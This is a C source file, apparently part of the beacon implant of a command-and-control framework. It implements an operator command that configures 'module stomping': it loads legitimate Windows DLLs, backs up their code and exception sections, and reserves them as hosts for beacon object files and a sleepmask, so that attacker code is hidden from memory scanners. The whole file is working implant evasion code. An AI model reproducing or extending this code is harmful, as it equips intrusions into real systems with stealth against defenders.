/* beacon/src/Commands/BofStomp.c
 * CMD_BOF_STOMP (0x31) - runtime reconfiguration of BOF module stomping.
 *
 * Wire format: sub_cmd(1) | data...
 *   0x00 (sync):  wchar_len(4LE) | wchar_bytes | flags(1)
 *   0x01 (async): count(1) | [wchar_len(4LE) | wchar_bytes]... | flags(1)
 *   0x02 (show):  (empty)
 *   0x03 (sm):    wchar_len(4LE) | wchar_bytes | flags(1)
 *
 *   flags bit 0: unload old DLL (1) vs restore original bytes (0, default)
 *
 * Response: UTF-8 text describing what happened. */

#include "Nax.h"
#include "LdrFlags.h"

/* ========= [ helpers ] ========= */

static VOID CleanupSlot( PNAX_INSTANCE Nax, BOF_STOMP_SLOT* slot, BOOL unload ) {
    if ( !slot->DllBase ) return;

    if ( !unload ) {
        DWORD oldProt;
        if ( slot->TextBackup && slot->TextBase ) {
            Nax->Kernel32.VirtualProtect( slot->TextBase, slot->TextCap, PAGE_READWRITE, &oldProt );
            MmCopy( slot->TextBase, slot->TextBackup, slot->TextCap );
            Nax->Kernel32.VirtualProtect( slot->TextBase, slot->TextCap, PAGE_EXECUTE_READ, &oldProt );
        }
        if ( slot->PdataBackup && slot->PdataBase ) {
            Nax->Kernel32.VirtualProtect( slot->PdataBase, slot->PdataSize, PAGE_READWRITE, &oldProt );
            MmCopy( slot->PdataBase, slot->PdataBackup, slot->PdataSize );
            Nax->Kernel32.VirtualProtect( slot->PdataBase, slot->PdataSize, PAGE_READONLY, &oldProt );
        }
    }

    if ( slot->TextBackup )
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, slot->TextBackup );
    if ( slot->PdataBackup )
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, slot->PdataBackup );

    if ( unload )
        Nax->Kernel32.FreeLibrary( (HMODULE)slot->DllBase );

    MmZero( slot, sizeof( BOF_STOMP_SLOT ) );
}

static BOOL ReloadSlot( PNAX_INSTANCE Nax, PWCHAR dllName, BOF_STOMP_SLOT* slot, BOOL unload ) {
    CleanupSlot( Nax, slot, unload );

    HMODULE hDll = Nax->Kernel32.LoadLibraryExW( dllName, NULL, DONT_RESOLVE_DLL_REFERENCES );
    if ( !hDll ) return FALSE;

    slot->DllBase = (PVOID)hDll;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hDll;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)( (PBYTE)hDll + dos->e_lfanew );
    slot->Nt = nt;

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION( nt );
    for ( UINT16 i = 0; i < nt->FileHeader.NumberOfSections; i++ ) {
        if ( sec[i].Name[0] == '.' && sec[i].Name[1] == 't' &&
             sec[i].Name[2] == 'e' && sec[i].Name[3] == 'x' &&
             sec[i].Name[4] == 't' ) {
            slot->TextBase = (PVOID)( (PBYTE)hDll + sec[i].VirtualAddress );
            slot->TextCap  = sec[i].SizeOfRawData;
            if ( slot->TextCap == 0 ) slot->TextCap = sec[i].Misc.VirtualSize;
            slot->InUse = FALSE;

            slot->TextBackup = Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, slot->TextCap );
            if ( slot->TextBackup )
                MmCopy( slot->TextBackup, slot->TextBase, slot->TextCap );

            PIMAGE_DATA_DIRECTORY exDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
            if ( exDir->VirtualAddress && exDir->Size ) {
                slot->PdataBase = (PVOID)( (PBYTE)hDll + exDir->VirtualAddress );
                slot->PdataSize = exDir->Size;
                slot->PdataBackup = Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, exDir->Size );
                if ( slot->PdataBackup )
                    MmCopy( slot->PdataBackup, slot->PdataBase, exDir->Size );
            }

            return TRUE;
        }
    }

    Nax->Kernel32.FreeLibrary( hDll );
    MmZero( slot, sizeof( BOF_STOMP_SLOT ) );
    return FALSE;
}

/* ========= [ command handler ] ========= */

FUNC INT NaxCmdBofStomp( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len,
                          PBYTE out, UINT32* out_len ) {
    if ( args_len < 1 ) return NAX_ERR_INVAL;

    UINT32 cap = *out_len;
    UINT32 off = 0;
    BYTE   subCmd = args[0];

    switch ( subCmd ) {

    /* ---- sync: replace sync DLL ---- */
    case 0x00: {
        if ( args_len < 5 ) return NAX_ERR_INVAL;
        UINT32 wlen = NaxR32( args + 1 );
        if ( 5 + wlen > args_len ) return NAX_ERR_WIRE;

        PWCHAR name = (PWCHAR)( args + 5 );
        UINT32 nchars = wlen / sizeof( WCHAR );
        if ( nchars == 0 || nchars >= 64 ) return NAX_ERR_INVAL;

        BOOL unload = ( 5 + wlen + 1 <= args_len ) ? ( args[5 + wlen] & 0x01 ) : FALSE;

        WCHAR buf[64]; MmZero( buf, sizeof( buf ) );
        MmCopy( buf, name, nchars * sizeof( WCHAR ) );

        BOOL ok = ReloadSlot( Nax, buf, &Nax->BofStompPool.SyncSlot, unload );
        if ( ok ) {
            MmZero( Nax->Config.BofSyncDll, sizeof( Nax->Config.BofSyncDll ) );
            MmCopy( Nax->Config.BofSyncDll, buf, nchars * sizeof( WCHAR ) );
        }

        off = NaxAppendStr((PCHAR)out, off, cap, ok ? "sync DLL updated: " : "sync DLL reload FAILED: " );
        off = NaxAppendWStr((PCHAR)out, off, cap, buf );
        off = NaxAppendStr((PCHAR)out, off, cap, unload ? " (old unloaded)" : " (old restored)" );
        break;
    }

    /* ---- async: replace async DLL pool ---- */
    case 0x01: {
        if ( args_len < 2 ) return NAX_ERR_INVAL;
        BYTE count = args[1];
        if ( count > BOF_STOMP_ASYNC_MAX ) count = BOF_STOMP_ASYNC_MAX;

        /* Scan ahead to find trailing flags byte after all DLL entries */
        UINT32 scan = 2;
        for ( BYTE i = 0; i < count && scan + 4 <= args_len; i++ ) {
            UINT32 wl = NaxR32( args + scan ); scan += 4;
            scan += wl;
        }
        BOOL unload = ( scan < args_len ) ? ( args[scan] & 0x01 ) : FALSE;

        /* Clean up existing async DLLs */
        for ( BYTE i = 0; i < Nax->BofStompPool.AsyncCount; i++ ) {
            BOF_STOMP_SLOT* s = &Nax->BofStompPool.AsyncSlots[i];
            if ( s->DllBase && !s->InUse )
                CleanupSlot( Nax, s, unload );
        }
        Nax->BofStompPool.AsyncCount = 0;
        Nax->Config.BofAsyncCount    = 0;

        /* Load new set */
        UINT32 p = 2;
        BYTE loaded = 0;
        off = NaxAppendStr((PCHAR)out, off, cap, "async pool updated" );
        off = NaxAppendStr((PCHAR)out, off, cap, unload ? " (old unloaded):\n" : " (old restored):\n" );

        for ( BYTE i = 0; i < count && p + 4 <= args_len; i++ ) {
            UINT32 wlen = NaxR32( args + p ); p += 4;
            if ( p + wlen > args_len ) break;

            PWCHAR wname  = (PWCHAR)( args + p );
            UINT32 nchars = wlen / sizeof( WCHAR );
            p += wlen;
            if ( nchars == 0 || nchars >= 64 ) continue;

            WCHAR buf[64]; MmZero( buf, sizeof( buf ) );
            MmCopy( buf, wname, nchars * sizeof( WCHAR ) );

            BOOL ok = ReloadSlot( Nax, buf, &Nax->BofStompPool.AsyncSlots[loaded], FALSE );
            if ( ok ) {
                MmZero( Nax->Config.BofAsyncDlls[loaded], sizeof( Nax->Config.BofAsyncDlls[loaded] ) );
                MmCopy( Nax->Config.BofAsyncDlls[loaded], buf, nchars * sizeof( WCHAR ) );
                loaded++;
            }
            off = NaxAppendStr((PCHAR)out, off, cap, "  " );
            off = NaxAppendWStr((PCHAR)out, off, cap, buf );
            off = NaxAppendStr((PCHAR)out, off, cap, ok ? " -> OK\n" : " -> FAILED\n" );
        }

        Nax->BofStompPool.AsyncCount = loaded;
        Nax->Config.BofAsyncCount    = loaded;
        off = NaxAppendStr((PCHAR)out, off, cap, "loaded: " );
        off = NaxAppendInt((PCHAR)out, off, cap, loaded );
        off = NaxAppendStr((PCHAR)out, off, cap, "/" );
        off = NaxAppendInt((PCHAR)out, off, cap, count );
        break;
    }

    /* ---- sleepmask: replace SmSlot DLL and re-wire ---- */
    case 0x03: {
        if ( args_len < 5 ) return NAX_ERR_INVAL;
        UINT32 wlen = NaxR32( args + 1 );
        if ( 5 + wlen > args_len ) return NAX_ERR_WIRE;

        PWCHAR name = (PWCHAR)( args + 5 );
        UINT32 nchars = wlen / sizeof( WCHAR );
        if ( nchars == 0 || nchars >= 64 ) return NAX_ERR_INVAL;

        BOOL unload = ( 5 + wlen + 1 <= args_len ) ? ( args[5 + wlen] & 0x01 ) : FALSE;

        WCHAR buf[64]; MmZero( buf, sizeof( buf ) );
        MmCopy( buf, name, nchars * sizeof( WCHAR ) );

        /* Free current resident BOF before swapping the DLL */
        NaxBofFreeResident( Nax );

        BOOL ok = ReloadSlot( Nax, buf, &Nax->BofStompPool.SmSlot, unload );
        if ( ok ) {
            MmZero( Nax->Config.SmStompDll, sizeof( Nax->Config.SmStompDll ) );
            MmCopy( Nax->Config.SmStompDll, buf, nchars * sizeof( WCHAR ) );
        }

        off = NaxAppendStr((PCHAR)out, off, cap, ok ? "sleepmask DLL updated: " : "sleepmask DLL reload FAILED: " );
        off = NaxAppendWStr((PCHAR)out, off, cap, buf );
        off = NaxAppendStr((PCHAR)out, off, cap, unload ? " (old unloaded)" : " (old restored)" );

        /* Re-wire sleepmask into the new slot from cached BOF bytes */
        if ( ok && Nax->SmBofCache && Nax->SmBofCacheLen > 0 ) {
            INT rc = NaxSleepmaskWire( Nax, Nax->SmBofCache, Nax->SmBofCacheLen );
            off = NaxAppendStr((PCHAR)out, off, cap, rc == NAX_OK ? "\nsleepmask re-wired OK" : "\nsleepmask re-wire FAILED" );
        } else if ( ok ) {
            off = NaxAppendStr((PCHAR)out, off, cap, "\nno cached sleepmask BOF - use sleepmask-set to load one" );
        }
        break;
    }

    /* ---- show: dump current config ---- */
    case 0x02: {
        off = NaxAppendStr((PCHAR)out, off, cap, "BOF Stomping: " );
        off = NaxAppendStr((PCHAR)out, off, cap, Nax->BofStompPool.Initialized ? "enabled\n" : "disabled\n" );

        off = NaxAppendStr((PCHAR)out, off, cap, "Sync DLL: " );
        if ( Nax->BofStompPool.SyncSlot.DllBase ) {
            off = NaxAppendWStr((PCHAR)out, off, cap, Nax->Config.BofSyncDll );
            off = NaxAppendStr((PCHAR)out, off, cap, " (.text cap=" );
            off = NaxAppendInt((PCHAR)out, off, cap, Nax->BofStompPool.SyncSlot.TextCap );
            off = NaxAppendStr((PCHAR)out, off, cap, Nax->BofStompPool.SyncSlot.InUse ? " IN USE)\n" : ")\n" );
        } else {
            off = NaxAppendStr((PCHAR)out, off, cap, "(not loaded)\n" );
        }

        off = NaxAppendStr((PCHAR)out, off, cap, "Async DLLs: " );
        off = NaxAppendInt((PCHAR)out, off, cap, Nax->BofStompPool.AsyncCount );
        off = NaxAppendStr((PCHAR)out, off, cap, "\n" );
        for ( BYTE i = 0; i < Nax->BofStompPool.AsyncCount; i++ ) {
            BOF_STOMP_SLOT* s = &Nax->BofStompPool.AsyncSlots[i];
            off = NaxAppendStr((PCHAR)out, off, cap, "  [" );
            off = NaxAppendInt((PCHAR)out, off, cap, i );
            off = NaxAppendStr((PCHAR)out, off, cap, "] " );
            off = NaxAppendWStr((PCHAR)out, off, cap, Nax->Config.BofAsyncDlls[i] );
            off = NaxAppendStr((PCHAR)out, off, cap, " (.text cap=" );
            off = NaxAppendInt((PCHAR)out, off, cap, s->TextCap );
            off = NaxAppendStr((PCHAR)out, off, cap, s->InUse ? " IN USE)\n" : ")\n" );
        }

        off = NaxAppendStr((PCHAR)out, off, cap, "Sleepmask DLL: " );
        if ( Nax->BofStompPool.SmSlot.DllBase ) {
            off = NaxAppendWStr((PCHAR)out, off, cap, Nax->Config.SmStompDll );
            off = NaxAppendStr((PCHAR)out, off, cap, " (.text cap=" );
            off = NaxAppendInt((PCHAR)out, off, cap, Nax->BofStompPool.SmSlot.TextCap );
            off = NaxAppendStr((PCHAR)out, off, cap, Nax->BofStompPool.SmSlot.InUse ? " IN USE)\n" : ")\n" );
        } else {
            off = NaxAppendStr((PCHAR)out, off, cap, "(not loaded)\n" );
        }
        off = NaxAppendStr((PCHAR)out, off, cap, "Sleepmask BOF: " );
        off = NaxAppendStr((PCHAR)out, off, cap, Nax->Gate ? "loaded" : "not loaded" );
        if ( Nax->SmBofCache )  {
            off = NaxAppendStr((PCHAR)out, off, cap, " (cached " );
            off = NaxAppendInt((PCHAR)out, off, cap, Nax->SmBofCacheLen );
            off = NaxAppendStr((PCHAR)out, off, cap, " bytes)" );
        }
        off = NaxAppendStr((PCHAR)out, off, cap, "\n" );
        break;
    }

    default:
        return NAX_ERR_INVAL;
    }

    *out_len = off;
    return NAX_OK;
}
